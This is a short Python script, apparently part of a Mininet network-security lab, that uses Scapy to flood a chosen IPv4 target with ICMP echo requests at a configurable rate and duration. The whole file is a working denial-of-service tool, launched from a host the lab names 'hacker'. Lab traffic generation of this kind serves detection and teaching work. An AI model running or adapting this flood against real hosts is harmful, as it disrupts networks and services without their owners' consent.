#!/usr/bin/env python3
"""Run an ICMP flood from a Mininet host namespace.

Example usage (from the Mininet CLI):
    mininet> hacker .venv/bin/python3 src/scripts/icmp_flood.py 10.0.3.10 -d 30 -p 200
"""

from __future__ import annotations

import argparse
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

# Default flood profile for demo traffic generation.
DEFAULT_ICMP_FLOOD_DURATION = 30
DEFAULT_ICMP_FLOOD_PPS = 200


def icmp_flood(
    target: IPv4Address,
    *,
    duration: int = DEFAULT_ICMP_FLOOD_DURATION,
    pps: int = DEFAULT_ICMP_FLOOD_PPS,
) -> None:
    """Send a burst of ICMP echo-request packets to a target.

    Args:
        target: Destination IPv4 address.
        duration: How long to sustain the flood in seconds.
        pps: Packets per second.
    """
    if duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    sent_packets = 0

    print(f"[{FILE_NAME}] {target=} {duration=}s {pps=}")

    while time.monotonic() < end_time:
        packet = scapy.IP(dst=str(target)) / scapy.ICMP(type="echo-request")
        scapy.send(packet, verbose=False)
        sent_packets += 1
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent_packets} packets sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate ICMP flood traffic.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("target", type=IPv4Address, help="Target IPv4 address")
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_ICMP_FLOOD_DURATION,
        help="Flood duration in seconds",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_ICMP_FLOOD_PPS,
        help="Packets per second",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    icmp_flood(args.target, duration=args.duration, pps=args.pps)


if __name__ == "__main__":
    main()
